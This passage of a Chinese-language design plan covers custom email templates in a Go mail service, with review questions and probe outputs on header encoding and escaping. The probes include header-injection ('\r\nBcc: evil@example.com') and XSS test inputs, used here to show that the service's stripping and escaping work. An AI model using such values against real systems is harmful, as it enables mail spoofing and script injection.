15. **（r4）发起人对 PG16 的偏好是第三条路**——例如「验证码模板整体不支持自定义」或
    「给 `AppURL` 但加白名单校验」。那么 §2.4「无需追问」的判断是错的：把 PG16 留到闸门
    意味着闸门只能批或不批，第三条路会在那里才第一次出现，而那时 r4 已经冻结。
16. **（r4，追加约束二）上游维护者要求 998 合规一次做对**，宁可接受内置路径输出变化。
    那么 §5.2 的取舍反了：正确响应是把 folding 做进来并放弃 INV4 的逐字节保证，
    而不是坚持截断。这个取舍权在上游，我们只负责把两条路摆清楚。
17. **（r4，PG17）发现主流邮件客户端或 MTA 会把 `Subject` 写进比预期更多的日志面**——
    那么「允许 `{{.Code}}` 进主题模板、只在文档里警告」这个处置偏轻，应当升级为
    渲染后检测（例如主题渲染结果若包含 `Code` 的值则回落内置并告警）。
    本次不做检测的依据是信任边界（§7.2），若边界判断被推翻，处置随之改变。

---

## 10. 并行切分（`work_partition`）

| unit_id | 覆盖 path | write_set | depends_on | shared_resources |
|---|---|---|---|---|
| U1 | P05, P06, P07, P08b, P09, P17, P18, P19, P20, P21, P22, P27, P28, P29 | `server/internal/service/email.go`、`server/internal/service/email_test.go`、`.env.example`、`docker-compose.selfhost.yml`、`apps/docs/content/docs/environment-variables{,.ja,.ko,.zh}.mdx`、`apps/docs/content/docs/auth-setup{,.ja,.ko,.zh}.mdx`、`SELF_HOSTING_ADVANCED.md` | — | — |

**`no_split_rationale`：输出单一单元，不切分。**

1. **代码面就是一个文件。** 全部生产改动集中在 `server/internal/service/email.go`（P05–P08b、P27），
   共享同一组新类型、同一套加载逻辑和同一条回落约定。拆开必然写集相交。
2. **文档面不能先于代码定稿。** 11 个文档/配置文件写的是变量名、默认值、文件名约定、降级语义，
   **以及 INV11 带来的 CJK 主题有效长度**——全部由 U1 的实现细节决定。先并行写文档，
   等实现调整命名就要重写，而且四语言要重写四遍。
3. **测试与实现必须同 Run。** INV4 的机械证据是「P08/P09/P17 零 diff」，这要求实现者在动
   `email.go` 的同时确认没碰那几段——跨单元无法保证。
4. **harness（P29）与被测代码耦合。** 抓包能力、DotReader 读取、`Advertise8BITMIME` 开关
   是 T01–T10 的前提，先做完才有 RED 可写，天然是同一单元的第一步。
5. 本次没有 migration、没有共享 aggregate、没有跨模块边界，切分收益接近零。

因此 stage 2 单卡片（HD-53 原地复用）：实现完成后在同一张卡片上评论 mention 验证，由验证角色置 `done`。

**给实现的冲突预案（U3/A6，本轮已复算）**：`upstream/main` = `09a2410e`（BASE+1，`#7592`，
与本次 write_set 零重叠，无需处理）。PR #7577 仍 open（`refs/pull/7577/head` = `155a2c72`），
其写集与 U1 高度重叠——它改 `.env.example`、四语言 `environment-variables*.mdx`、`email.go`
（新增 `parseFromEmail` / `newMessageID`，改写 `sendSMTP` 的 `msgID`、`c.Mail()`、`From:` 三行）
和 `email_test.go`（+268 行）。两点提示：

- **不要把 #7577 的改动捎带进我方 PR。** 那是维护者自己的 PR，混进去等于替他提交。
- **mock relay 的抓包能力要自己建。** #7577 给 `testSMTPServer` 加了 `ReceivedMailFrom` /
  `ReceivedData` 两个 channel 和 `sendViaTestServer` helper，我方全部 SMTP 侧验收都需要等价能力，
  但 BASE 里没有。**用不同的命名**（如 `CapturedEnvelope` / `CapturedData`），这样若 #7577
  后来合入，冲突是可读的重复代码而不是同名不同义的静默覆盖。
- **（r2 补充）我方 harness 比 #7577 的多两项要求**：DotReader 反 stuffing（R15/PG4）与
  `Advertise8BITMIME` 开关（R14/T05b）。即使 #7577 合入，它的 harness 也不能直接满足 T05b/T10。

---

## 11. Council 提名

`council_nomination`：3 位，锚点互异，L3 承担反对者职责。lens 拿到的是 `must_answer` 而非本方案，
问题均能独立成立。

**r4 对全部 `must_answer` 做了一次逐条重扫，判据是调度 M-L19 的那条：**

> `must_answer` 只能承载**可证伪的验证探针**；凡问句的答案会**改变方案本身**
> （而不是确认方案成立），就是规划该裁决而没裁决的，必须移回正文。

**命中 7 条**（L1-3、L1-6、L1-7、L2-5、L2-7、L3-6、L3-7），全部改写；
其中两条的后果最重：L2-5 就是 `PG16`（实现开工第一步撞上、整条链返工），
L2-7 就是 `PG19`（同型，只是没人撞上所以活了下来）。
每条改写都遵循同一个动作：**把裁决搬进正文，把「怎么证明这个裁决错了」留在 `must_answer`**。
下表逐条对照，便于核对方机械检查：

| 原编号 | 原问句里的未决部分 | 裁决落点 | 改写后的探针形态 |
|---|---|---|---|
| L1-3 | 「998 还是 1000 还是 78？」 | 闸门 1 已裁 998（§2.3、§5.1） | 求证真实 relay/MUA 对超长主题的处置，及 rune 截断的完整性 |
| L1-6 | 「这是 bug 还是正确行为？」 | §11 注 A：是正确行为 | 求证主题渲染结果中不出现 HTML 实体 |
| L1-7 | 「需要在验收里覆盖吗？」 | §11 注 B：不新增验收项 | 求证非 HTML 模板产出在 MUA 侧的实际后果 |
| L2-5 | 「`AppURL` 是否带进了新信息？」 | **§0.8 / §7.1.1，PG16** | 求证 `g` 判据可机械执行、T26 真的会红 |
| L2-7 | 「DEV 模式下模板是否生效？」 | **§7.4，PG19：不生效** | 求证 DEV 分支 stdout 与 BASE 逐字节相同 |
| L3-6 | 「A7 该不该被否决——请给出你的判断」 | 闸门 1 已裁「加」（§2.3） | 求证 INV11 的实际收益（relay 行为证据），不再要求裁决 |
| L3-7 | 「这条诊断是否应当整条删掉？」 | §7.3 保留为诊断；删与不删的条件写进 §9-11 | 求证真实模板上的假阳性率（U8） |

**注 A（L1-6 的裁决）**：主题走 `text/template`、正文走 `html/template` 的不对称是**正确行为**，
不是 bug。依据是现有代码自己的注释（`email.go:413-416`）：主题不做 HTML 渲染，
用 HTML 转义会把 `&#34;` 之类实体字面量泄进收件箱。同一字段在主题里是裸文本、
在正文里是实体，**正是两个上下文各自正确的结果**。文档（T21）需要一句说明，
避免运维方以为是 bug；不需要新增验收项——T06/T07/T25 已覆盖正文侧，T08 已覆盖主题侧。

**注 B（L1-7 的裁决）**：`Content-Type: text/html; charset=UTF-8` **保持固定**，
不因模板内容而改变，也不新增「模板是否产出合法 HTML」的验收项。理由：合法性无法在
我方可靠判定（HTML5 容错极强，几乎任何字节序列都能被 MUA 渲染出东西），
加一条判不准的检查只会制造假红；而运维方写坏自己的模板，后果限于自己的部署、
可见、可改。这与 §7.3「告警放行不 fail fast」是同一条原则。

| lens_id | 锚点 | rationale（引用本次具体 path / invariant） | dissent_role |
|---|---|---|---|
| L1 | SMTP 传输层与信头文法 | 本次把**任意运维方文本**首次送进 `email.go:292` 的 `QEncoding.Encode`（Subject）、`:296-307` 的 QP 分支与 `:328` 的 `DotWriter`（Body）。今天这三处只见过字面量常量和经 `sanitizeSubjectField` 过滤的短字段。INV2 的裁决（PG1 选项 1）把控制字符防线从 `QEncoding` 挪到了我方代码，INV11 又新增了一条 998 octet 的行长约束——两条都押在「这些层对任意输入的行为我已经测准了」上。同时 R10 让 `invitation.go:239` 的 goroutine 与 `auth.go:356` 的请求 goroutine 并发命中同一个共享 `*template.Template`（U5 未验证） | 否 |
| L2 | 凭据落点与日志面 | `code` 从 `handler/auth.go:340` 生成，今天在日志里的唯一落点是 `email.go:353` 的 DEV `fmt.Printf`。本方案给 `SendVerificationCode` 新增了运行期渲染失败告警，**并新增了一条启动期零值预执行诊断**——两条都要写日志，而运行期那条手上正握着含 `Code` 的数据结构。INV1 防的是一个「顺手写错一个日志参数就破防」的不变量，而 r2 把日志点从 1 个增加到了 3 个 | 否 |
| L3 | 信任边界与上游可接受性 | 整个安全论证压在一句断言上：「模板作者 = 部署运维方，因此不新增权限」（§7.2）。这句话一旦在某条路径上不成立，§6 弃 C 选 A 的理由和 §7 的三个回答同时垮掉。同时 A1 是唯一「错了就作废」的假设，**且上游问询已取消（F6），U1 在本次交付内不可验**。r2 还新增了两处会被上游 review 盯住的重复（`buildInvitationParams` / `sanitizeSubjectField` 各两份，§4.3） | **是** |

### L1 — `must_answer`

1. `email.go:292` 的 `mime.QEncoding.Encode` 对一条**任意长度、任意字节**的主题串，是否存在
   任何输入使编码结果里出现裸 CR 或 LF，从而在 `:319-327` 的 header 块中拆出第二个 header？
   **已知它对 TAB 不编码**——除 TAB 外还有别的豁免吗？
2. 若主题在进入 `QEncoding` 之前已剥离全部 `unicode.IsControl` 字符，剩余的字符集中是否还有
   任何字符能影响 header 块的文法（结构、折行、字段边界）？换言之，把控制字符防线放在
   `QEncoding` **之前**而不是依赖它，是否真的覆盖完全？
3. **（r4 改写）** `Subject:` 行超过 RFC 5322 的 998 octet 时，**真实 relay 与收件方 MUA 的
   实际处置是什么**——静默接受、截断、改写、还是拒信？请给出可复现的观测，而不是引用 RFC。
   另请验证：我方按 **rune** 截断到 `subjectLine ≤ 998`，是否存在任何输入使截断结果落在
   多字节字符中间，或使 `QEncoding` 产出一个不可解码的 encoded-word？
   （阈值取 998 已由闸门 1 裁定，不在本题范围；本题求的是**该裁定的实际收益证据**。）
4. `email.go:328` 经 QP（`:296-307`）与 `textproto.DotWriter` 写出的正文，是否存在任何输入
   （含 8BITMIME 与 quoted-printable 两条分支）能提前终止 DATA 或注入新 header？
5. 一个进程级共享的 `*html/template.Template` 被 `invitation.go:239` 的 goroutine 与
   `auth.go:356` 的请求 goroutine 并发 `Execute`，是否安全？首次执行时的转义分析阶段是否有竞争？
   若不安全，正确修法是 `Clone()`、加锁、还是预热？
6. **（r4 改写）** 主题走 `text/template`、正文走 `html/template`。方案裁定这个不对称是正确
   行为（§11 注 A）。请求证或证伪：构造一个工作区名，使**主题**的渲染结果中出现 HTML 实体
   （`&amp;` / `&#34;` / `&lt;` 等）或 `#ZgotmplZ`——若能构造出来，说明主题侧混进了 HTML 转义，
   裁决错误。反向也请验：同一字段在正文侧**必然**被转义（不转义才是漏洞）。
7. **（r4 改写）** `email.go:325` 固定 `Content-Type: text/html; charset=UTF-8`，方案裁定
   不随模板内容改变、不新增合法性验收（§11 注 B）。请给出实际后果的观测：一个产出**纯文本**
   （无任何标签）的自定义模板，在主流 MUA 里呈现成什么？换行是否全部丢失？
   若结果是「内容不可读」而非「显示不美观」，注 B 的依据（后果限于自己的部署、可见可改）
   就站不住，需要在文档里补一句而不是靠运维方自己撞。

### L2 — `must_answer`

1. 列出改动后 `code` 在内存与 I/O 中出现的**全部**位置，逐一说明它能否到达 stdout、stderr、
   `slog` 或任何持久化面。与改动前的清单（`email.go:353` 一处）相比多了几处？
2. 本方案有**三个**新增日志点：启动解析告警、启动零值预执行诊断、运行期渲染失败告警。
   逐个判断：哪些手上持有含 `Code` 的数据结构？哪些持有已渲染内容？若实现者写成
   `fmt.Printf("...%+v", data)` 或 `..., buf.String()`，哪一个会最先泄露验证码？
3. T16 的探针（固定哨兵 code + 全量捕获 stdout+stderr 后 grep）在上述每一种写错的写法下
   **是否真的会变红**？请构造出至少一种能通过 T16 却仍然泄露验证码的实现写法——如果构造得出，
   T16 就不足以支撑 INV1。
4. 启动期零值预执行用的是零值数据（`Code == ""`），所以它的诊断日志里不可能有真验证码。
   但若将来有人为了减少假阳性把它改成用**样例数据**（`Code: "123456"`）预热，INV1 会不会破防？
   方案里有没有一条约束能挡住这次修改？
5. **（r4 改写——原问句是 PG16，已在 §0.8 / §7.1.1 裁决，不再向 lens 求裁决）**
   方案声称 §7.1 硬规则 3 的字段准入判据「可机械执行」：字段 F 准入当且仅当存在确定性 `g`，
   使 `F = g(该封信在 BASE 上已产生的 Subject 与 HTML 正文字节)`。请证伪这个「可机械执行」：
   (a) 在 §7.1.1 的 9 行里找出任何一行，其 `g` 你会给出与方案不同的判定；
   (b) 构造一个**新**字段，使两个称职的工程师对它是否准入给出相反答案。
   任一项成立，判据就退化成需要人裁量的表述，INV13/T26 只保住字段集合不变、保不住新增合规。
6. `bytes.Buffer` 中的已渲染正文（含验证码）在 `Execute` 失败后是否会被复用、被日志引用、
   或因为逃逸分析留在某处？失败路径上它应该被显式丢弃吗？
7. **（r4 改写——原问句是 PG19，已在 §7.4 裁决：DEV 分支渲染前返回）**
   请求证或证伪该裁决的落实：在 `EMAIL_TEMPLATE_DIR` 配置了自定义验证码模板、
   且既无 `SMTP_HOST` 也无 `RESEND_API_KEY` 的条件下，进程 stdout 的**全部**输出
   是否与 BASE 逐字节相同（只有 `EmailService: …` 一行 + `[DEV] Verification code for …` 一行）？
   若出现任何第三行、或那两行内容有任何差异，裁决未落实，验证码新增了一个日志落点。
8. **（r4 新增，PG17）** 主题模板与正文模板共用同一个数据结构，因此验证码的**主题**模板里
   写 `{{.Code}}` 是合法的——那会把验证码送进 MTA 日志与锁屏预览，一个今天不存在的落点。
   方案选择「允许 + 文档警告」（§7.1.1 末段）。请回答两件可证伪的事：
   (a) T21 要求的四语言警告，在实现交付的文档里是否**四处都在**、且措辞明确点出主题会进日志？
   (b) 除 MTA 日志与锁屏预览外，`Subject` 还会到达哪些正文不会到达的面
   （网关归档、反垃圾评分日志、推送摘要、邮件列表主题索引）？清单越长，
   「只警告不检测」这个处置越可能偏轻——那时应升级为渲染后检测（§9-17）。

### L3（反对者）— `must_answer`

1. **本方案在什么条件下是错的？** 具体地：找出至少一条路径，使得「能写
   `EMAIL_TEMPLATE_DIR` 指向的文件」的主体**不等于**「能修改部署的主体」。
   容器内任意具备写权限的进程、CI/CD 制品注入、共享卷的其他挂载方、备份恢复流程——
   逐条排除还是逐条确认？R11 已确认后端容器无 `USER` 指令（即以 root 运行）、无只读根文件系统，
   这对结论有影响吗？
2. §6 对方案 C 的否决理由是「验证码邮件在 `auth.go:334-360` 全程不涉及 workspace，
   因此租户管理员编辑该模板即跨租户提权」。这个论证对**邀请邮件**成立吗？
   若只把 DB + UI 限定在邀请邮件上（验证码邮件仍只能文件系统覆盖），方案 C 是否重新可行？
   若是，本方案是否过早地整体否决了 C？
3. §7.2 声称「运维方本来就控制二进制，给他模板能力不新增任何权限」。
   在**托管式自建**（第三方代运维、PaaS 一键部署、有人替客户管容器但客户不管代码）场景下，
   这句话还成立吗？谁是那里的「运维方」？
4. 本方案把「未配置时零变更」做成结构性质的代价是代码里长期并存**两套**重复：邮件构造函数
   （`buildInvitationParams` / `...FromTemplate`）与主题清洗函数（`sanitizeSubjectField` /
   `sanitizeRenderedSubject`）。上游维护者是否可能因为这个重复而拒绝 PR？如果他要求合并成
   一条路径，INV4 与 INV3 还剩什么可执行的保证手段？T22 那种「对照测试」够不够替代零 diff？
5. A2 判定「验证码邮件没有可靠 locale 来源」。请反驳：`Accept-Language` 请求头、
   已存在用户的历史偏好、实例级默认语言——这三者有没有一个足以支撑首版就做多语言？
   如果有，non-goal 2 是不是在回避一个上游一定会提的需求？
6. **（r4 改写——Q5a/Q5b 已由闸门 1 裁定「加 / 可否」，不再向 lens 求裁决；求的是证据）**
   INV11 的 998 octet 上限把一条中文主题的有效长度从 200 字压到 **91** 字
   （91 是纯中日韩的值；纯 4 字节 emoji 是 67；纯 ASCII 不受影响），
   **而这个产品的目标用户正是想用自己语言发信的自建方。**
   请给出**可复现的观测**回答：主流 relay 与 MUA 对超过 998 octet 的 `Subject:` 行，
   实际做什么？考虑到内置路径今天就产出 1349 octet 且从未有人报障（§12 探针 R5），
   INV11 是在换取真实的送达率，还是只买到了一行 spec 合规？
   **另请评估 §5.2 的取舍**：folding 才是 RFC 5322 §2.2.3 的正解、且已被证明可行
   （编码字最长 75 octet，折行后每行 76），方案不做它的理由是「会改到共用的内置路径、
   破坏 INV4 的逐字节保证」。这个理由在上游维护者眼里成立吗？如果不成立，
   正确做法是做 folding 并放弃 INV4——请指出这个判断的错处，而不是复述它。
7. **（r4 改写——「删不删」是我的裁决，已在 §7.3 定为保留；求的是删除条件的证据）**
   零值预执行诊断既不 sound 也不 complete，唯一价值是把「字段名拼错」提前到启动时暴露。
   请求证：**真实运维方写的邮件模板里，`{{slice}}` / `{{index}}` / `{{range}}` 一类
   会在零值上失败、在真数据上成功的表达式，出现频率有多高？**
   若这个频率高到启动时会刷出成批假阳性告警，运维方会学会忽略它、于是真阳性也被忽略，
   §9 第 11 条即成立，这条诊断应整条删除（此时 §7.3 退化为解析期 + 运行期两时机）。
   给出频率证据即可，删除与否由规划按该证据重裁。

### `declined_lenses`

| lens | 不提名的理由 |
|---|---|
| 数据库 / migration 视角 | 方案 A 无 schema 改动、无 sqlc 变更、无持久化派生记录（P26 已排除）。没有实质检查面 |
| 前端 / UX 视角 | 无 UI 改动（non-goal 1，P25 已排除）。收件人可见面由 L1 覆盖信头与传输、由 L3 覆盖钓鱼与信任边界 |
| 并发 / 竞态视角（独立提名） | 本次唯一的并发面是共享 `*template.Template`（U5/R10），检查点只有一个且与发送路径不可分。已折进 L1 的 `must_answer` 5，单独提名会造成锚点与 L1 重叠 |
| 性能 / 容量视角 | 模板启动时解析一次、渲染写入栈上 `bytes.Buffer`，无 per-send 磁盘 I/O（A3 排除热重载）。相对于一次 SMTP 往返，开销不可测。**唯一新增的 per-send 开销是 INV11 的 octet 度量（一次 `QEncoding.Encode`），量级同样不可测** |

---

## 12. 实测证据（可复现）

以下事实在方案中被当作前提使用。探针 A / P1 / B/C/D / P4 / P5 / P5b / P6 / P7 / P8 / U / S
为 r2 轮实测并在本轮保留；**探针 R1–R6 为 r3 新增或重跑**，§8.1 的每个数字都指向其中一条。
复现环境 `go1.27.0 linux/arm64`，探针写在**仓库外**的临时目录，执行后已删除，仓库工作树保持 clean。

**记录纪律（r3 新增，PG10 的处置）——每条探针输出必须同时写明三项：**

| | 含义 | r2 缺了什么 |
|---|---|---|
| **位置** | 观测点在管线的哪一步 | r2 已有这一项 |
| **阈值** | 判据用的具体数值 | **r2 没有**——探针 D 用 900，INV11 用 998，两个数字都在文档里但从未并列出现过，于是没人看出它们不一样 |
| **构造** | 输入是怎么造出来的（字符集、长度、拼接方式） | **r2 没有**——探针 D 第二行「301 runes」本轮无法复现（PG13），因为没人知道 `ascii+1nonascii` 具体指什么 |

写清楚位置而不写阈值，看起来像已经严谨了，实际上漏掉的那一半正是 PG10 的入口。
**下面每条探针都按这三项标注**；标不出「构造」的旧输出一律删除，不留在文档里当证据。

**环境前置（本工作区两条硬事实，任何 Go 命令首次执行都会踩到）：**

```bash
export PATH=$PATH:/usr/local/go/bin          # PATH 不含 Go
export GOTMPDIR=/workspaces/.../go-tmp       # TMPDIR 指向 noexec 的 /tmp
```

### 探针 A — `QEncoding` 的触发条件（PG1 的决定性证据）

```
A U+0009 IsControl=true  Q="Hi\tThere"                  ← TAB 原样穿过，未编码
A U+000D IsControl=true  Q="=?utf-8?q?Hi=0DThere?="
A U+000A IsControl=true  Q="=?utf-8?q?Hi=0AThere?="
A U+007F IsControl=true  Q="=?utf-8?q?Hi=7FThere?="
A U+000B IsControl=true  Q="=?utf-8?q?Hi=0BThere?="
A strip("Hi\tThere") = "HiThere"
```

源码依据 `/usr/local/go/src/mime/encodedword.go:42-49`：

```go
func needsEncoding(s string) bool {
	for _, b := range s {
		if (b < ' ' || b > '~') && b != '\t' { return true }
	}
	return false
}
```

**管线位置**：这是对 `QEncoding` **孤立行为**的观测，位于管线第 4a 步。**不得**直接用作管线
末端的验收预期——这正是 r1 T08 犯的错。

### 探针 P1 — PG1 两个选项的产出（独立复算，与调度、实现均一致）

```
P1 rendered   = "Hi\r\nBcc: evil@example.com"
P1 stripped   = "HiBcc: evil@example.com"
P1 Q(stripped)= "HiBcc: evil@example.com"                     ← 选项 1（r2 采用）
P1 Q(rendered)= "=?utf-8?q?Hi=0D=0ABcc:_evil@example.com?="   ← 选项 2（r2 不采用）
```

### 探针 B/C/D — 主题长度与 `Subject:` 行 octet 数（PG3/INV11 的依据）

```
B today worst-case: runes=147 rawbytes=387 SubjectLine=1349 (RFC5322=998)
  ← 今天的内置邀请主题，两个 60-rune CJK 字段，已超限（既有问题，non-goal 10）

C cap=200 runes -> SubjectLine=2185 octets  fits998=false
C cap=150 runes -> SubjectLine=1644 octets  fits998=false
C cap=120 runes -> SubjectLine=1322 octets  fits998=false
C cap=100 runes -> SubjectLine=1103 octets  fits998=false
C cap= 80 runes -> SubjectLine= 884 octets  fits998=true
C cap= 60 runes -> SubjectLine= 665 octets  fits998=true

D pure-ascii 200 runes line = 209 octets (unencoded passthrough)
```

> **r3 删除了探针 D 的前两行。** 原文为：
> `D largest all-CJK subject under 900 octets = 81 runes (line=893)` 与
> `D largest ascii+1nonascii subject under 900 octets = 301 runes (line=379)`。
> 第一行的阈值是 **900** 而 INV11 是 **998**，它是「~81」这个错值的唯一来源（§0.4 PG10）；
> 第二行在任何阈值下都复现不出（900 得 731、998 得 814），且「ascii+1nonascii」的构造
> 无从还原（§0.7 PG13）。**两行都不是本方案任何断言的证据，留着只会再骗一次读者。**
> 998 之下的正确数字见探针 R1。

`QEncoding` **不折行**：`splitWord`（`encodedword.go:173-178`）在两个 encoded-word 之间写的是
一个**空格**，不是 CRLF。所以超长主题产出的是一条超长行，不是合法的折行 header。

- **位置**：管线末端（P11 → P12），与验收观测点一致。
- **阈值**：B/C 两组为 **998**（RFC 5322，与 INV11 一致）；D 保留行无阈值判定。
- **构造**：B = 内置邀请主题模板 + 两个 60-rune CJK 字段；C = `中` 重复 cap 次；
  D 保留行 = `a` 重复 200 次。

### 探针 P4 — PG2：`Parse` 与 `Execute` 的分工（两条路径都测）

```
P4 html Parse err = <nil>
P4 html Execute err = template: body:1:5: executing "body" at <.SMTPPassword>:
                      can't evaluate field SMTPPassword in type main.verificationTemplateData
P4 text Parse err = <nil>
P4 text Execute err = template: subj:1:2: executing "subj" at <.SMTPPassword>:
                      can't evaluate field SMTPPassword in type main.verificationTemplateData
```

### 探针 P5 — 零值预执行既不 sound 也不 complete（PG2 裁决的依据）

```
P5 unknown-field  zeroExec=true  realExec=true    {{.SMTPPassword}}
P5 false-positive zeroExec=true  realExec=false   {{slice .Code 0 3}}
   zeroErr: executing at <slice .Code 0 3>: error calling slice: index out of range: 3
P5 false-negative zeroExec=false realExec=true    {{if .Code}}{{slice .Code 0 99}}{{end}}
   realErr: executing at <slice .Code 0 99>: error calling slice: index out of range: 99
P5 ok             zeroExec=false realExec=false   code={{.Code}}
```

### 探针 P5b — parse tree 静态校验的真实成本（non-goal 9 的依据）

```
P5b tree root for {{with .Code}}{{.}}{{end}}: {{with .Code}}{{.}}{{end}}
```

树里那个 `{{.}}` 指的是 `.Code` 而非根数据。任何字段白名单校验器都必须建模
`{{with}}` / `{{range}}` / `$var` 下的 `.` 重绑定，否则会把合法模板判坏。

### 探针 P6 — `html/template` 的上下文转义（INV7/T06/T07 的依据）

```
P6 https://multica.ai/invite/abc  -> <a href="https://multica.ai/invite/abc">x</a>
P6 javascript:alert(1)            -> <a href="#ZgotmplZ">x</a>
P6 https://a.com/?x=1&y=2         -> <a href="https://a.com/?x=1&amp;y=2">x</a>
P6 text-context img               -> &lt;img src=x onerror=alert(1)&gt;
```

### 探针 P7 — quoted-printable 击穿原始 DATA 断言（PG4 的构造性反例）

```
P7 raw len=142 qp len=153
P7 qp contains literal "From: evil@example.com"                = true
P7 qp contains literal "&lt;img src=x onerror=alert(1)&gt;"    = false   ← r1 T06 会假红
P7 qp contains literal "#ZgotmplZ"                             = true
P7 qp soft-break count (=\r\n) = 1

<div><p>From: evil@example.com</p><p>Reply-To: evil@example.com</p><p>&lt;i=
mg src=3Dx onerror=3Dalert(1)&gt;</p>
.
<a href=3D"#ZgotmplZ">u</a></div>
```

两个独立的击穿点：`=`→`=3D`（**恒定**）与 76 列软换行 `=\r\n`（**位置相关**）。后者更危险——
它随内容长度移动，所以一条今天恰好通过的断言，会在别人改了模板 fixture 之后无声变红或变绿。
**管线位置**：P28（QP 分支）之后、P13（DotWriter）之前。

### 探针 P8 — 完整 header 块的解析（T08/T23 的观测方法）

```
P8 ReadMessage err = <nil>
P8 Subject decoded ok = true err = <nil> roundtrip=true      ← 2185 octet 的 Subject 也能解析
P8 header line count in block = 6
P8 option2 ReadMessage err=<nil> bccPresent=false subj="=?utf-8?q?Hi=0D=0ABcc:_evil@example.com?="
```

**注意**：`net/mail` **不校验** 998 octet 行长，所以它能解析并不代表 relay 会接受。
T23 必须**显式断言 octet 数**，不能只断言「能解析」。

### 探针 U — 上游状态复算（U3/A6，取代 r1 探针 5）

```
$ git ls-remote https://github.com/multica-ai/multica HEAD refs/pull/7577/head
09a2410e882be8435bd6c4a26e03f7e288038203    HEAD            ← 已不等于 BASE
155a2c7229e85b01bfdfe9c2a89071baf99688f1    refs/pull/7577/head

$ git merge-base --is-ancestor f74a71060... FETCH_HEAD  → YES
$ git rev-list --count f74a71060...FETCH_HEAD           → 1
$ git log --oneline f74a71060...FETCH_HEAD -- server/internal/service/email{,_test}.go
  (空)                                                   ← #7577 仍未合入
$ git log --oneline -1 09a2410e
  09a2410e8 refactor(agents): rename starter_prompts to conversation_starters (MUL-6709) (#7592)
$ git diff --name-only f74a71060..09a2410e | grep -E "email|environment-variables|auth-setup|SELF_HOSTING|docker-compose.selfhost|\.env\.example"
  (空)                                                   ← 与本次 write_set 零重叠
```

### 探针 S — 仓库既有事实（R12/R13/R14/R15、T19 的依据）

```
$ sed -n '227,238p' server/internal/service/email.go
  → 三个 case 各一行 fmt.Printf("EmailService: ...")     ← R12，无条件打印
$ sed -n '319,327p' server/internal/service/email.go
  → "Date: " + time.Now().UTC()... / "Message-ID: " + msgID(time.Now().UnixNano())  ← R13
$ sed -n '569,578p' server/internal/service/email_test.go
  → EHLO 应答：250-test-smtp Hello / [250-STARTTLS] / [250-AUTH ...] / 250 OK
     无 8BITMIME                                          ← R14
$ sed -n '616,624p' server/internal/service/email_test.go
  → for { dataLine := readLine(); if dataLine == "." { break } }   ← R15，丢弃且不 unstuff
$ grep -n "test-go.sh" .github/workflows/ci.yml
  535:        run: bash scripts/test-go.sh --race         ← T19 引用订正（r1 写 534）
$ sed -n '28,29p' scripts/test-go.sh
  cd "$REPO_ROOT/server"                                  ← 脚本自己 cd，两种调用都可
```

---

### 探针 R1 — 998 之下的真实有效长度与量化台阶（PG10 的处置，**r3 新增**）

- **位置**：管线末端（P11 → P12），`subjectLine(s) = len("Subject: " + QEncoding.Encode("utf-8", s))`，不含 CRLF。
- **阈值**：**998**（RFC 5322 §2.1.1），与 INV11 §5.1 完全一致；同时把 900 作为对照跑一遍，用来定位 r2 的错值来源。
- **构造**：`strings.Repeat(ch, n)`，`ch` 分别取 `中` / `語` / `한` / `a`；「CJK+空格」为每第 8 个 rune 换成空格。

```
== F3. r2 probe D, recomputed at the ACTUAL invariant threshold 998 ==
  T=900  largest all-CJK          =  81 runes (line=893)   ← r2 的「~81」就是这一行
  T=900  largest ascii+1nonascii  = 731 runes (line=900)   ← r2 写 301，复现不出（PG13）
  T=998  largest all-CJK          =  91 runes (line=996)   ← INV11 真正需要的
  T=998  largest ascii+1nonascii  = 814 runes (line=996)
  pure-ascii 200 runes line = 209 (unencoded passthrough: true)

== F4. per-rune cost & encoded-word quantisation around the boundary ==
  n=88 line= 969 delta= 0 encoded-words=13
  n=89 line= 978 delta= 9 encoded-words=13
  n=90 line= 987 delta= 9 encoded-words=13
  n=91 line= 996 delta= 9 encoded-words=13
  n=92 line=1018 delta=22 encoded-words=14   ← 台阶：998 落在 996 与 1018 的缝里
  n=93 line=1027 delta= 9 encoded-words=14

== F5. CJK effective length for docs (T21) across the three CJK scripts ==
  中文     max runes under 998 = 91 (line=996)
  日本語   max runes under 998 = 91 (line=996)
  한국어   max runes under 998 = 91 (line=996)
  CJK+空格 max runes under 998 = 99 (line=998)
```

**这条探针同时证明两件事**：正确值是 91；以及 r2 的 81 来自 `T=900`——**度量口径从头到尾
都是对的，错的是阈值**。所以 §5.1 把阈值与度量并列写死，而不只是「把口径写清楚」。

### 探针 R2 — 不动点性质与 998 的可达性（PG11 的处置，**r3 新增**）

- **位置**：`sanitizeRenderedSubject` 的 octet 截断步（P27），单元级，不过 wire。
- **阈值**：998。
- **构造**：B1/B2 为 5 个字符集（ascii / latin1 / cjk / emoji / mixed）的随机串；B3 为每字符集 200k 次随机采样；B4/G 为确定性双参数枚举。

```
== B1. monotonicity of subjectLine over prefixes, randomized ==
  4000 random strings x every prefix: non-monotone steps = 0

== B2. fixed-point property of truncateToOctetLimit, randomized ==
  20000 random inputs (<=200 runes, 5 alphabets): violations = 0

== B3. is exactly 998 reachable, per alphabet, within 200 runes? ==
  ascii  : NOT reachable by 200k random samples
  latin1 : NOT reachable by 200k random samples
  cjk    : NOT reachable by 200k random samples     ← T24 在 r2 自己的字母表下不可构造
  emoji  : reachable, runes=71 line=998             （该表含 3 字节的 U+2728）
  mixed  : reachable, runes=151 line=998

== B5. leader's construction reproduced ==
  22x"é" + 63x"中" + 109x"a" : runes=194 line=998 exact998=true
  +1 ascii -> line=999 ; truncate returns original: true

== G. deterministic (wide,narrow) enumeration for an exactly-998 line ==
  wide="中" narrow="a" -> UNREACHABLE within 200 runes
  wide="é" narrow="a" -> runes=198 line=998  (wide x122 + narrow x76)
      +1 narrow rune -> line=999
  wide="😀" narrow="a" -> runes=192 line=998  (wide x56 + narrow x136)
      +1 narrow rune -> line=999
  first pair that succeeds, in the fixed order above, is what T24b would pick.
```

B1 是 §5.1 单调性前提的依据，B2 是 T24a 的依据，B3 是 PG11 finding 成立的依据（r2 的
T24 在纯 CJK 与纯 ASCII 下都不可构造），G 是 T24b 的依据。**B5 说明调度给的构造是对的**，
我不采纳它写进源码，采纳的是「运行期用同样的方法推导出来」。

### 探针 R3 — 单调性（INV11 前提，**r3 新增**）

见上方 B1。单独列出是因为它在方案里的角色不同：B2/B3 支撑测试用例，**B1 支撑的是不变量
本身的良定义性**。r2 从未验证过它，却依赖它。**5 字符集 × 4000 串 × 全前缀，非单调步 = 0。**

### 探针 R4 — 控制字符表（T22/INV12，**r3 新增**）

